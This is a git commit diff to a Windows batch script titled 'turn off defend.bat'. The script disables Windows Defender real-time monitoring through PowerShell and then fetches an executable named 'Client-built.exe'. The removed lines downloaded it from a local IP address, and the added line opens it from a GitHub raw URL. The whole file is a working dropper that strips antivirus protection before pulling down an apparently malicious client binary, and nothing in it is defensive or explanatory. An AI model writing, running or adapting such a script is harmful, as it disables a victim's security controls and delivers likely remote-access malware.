2b1a6a9bdde69a5ee78bae1baca51d0561e559a3
Joshua Daniel <85048311+joshuadaniel-8090@users.noreply.github.com>
2024-03-25 13:30:15 +0530

    turn off updated

--- turn off defend.bat
+++ turn off defend.bat
@@ -1,12 +1,3 @@
 @echo off
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-setlocal
-
-rem Set the URL of the file you want to download
-set "url=https://192.168.0.114/Client-built.exe"
-
-rem Set the destination path where you want to save the downloaded file
-set "destination=C:\Users\mca1\Downloads"
-
-rem Use PowerShell to download the file
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
+start "LinkName" "https://github.com/joshuadaniel-8090/assests/raw/master/Client-built.exe"
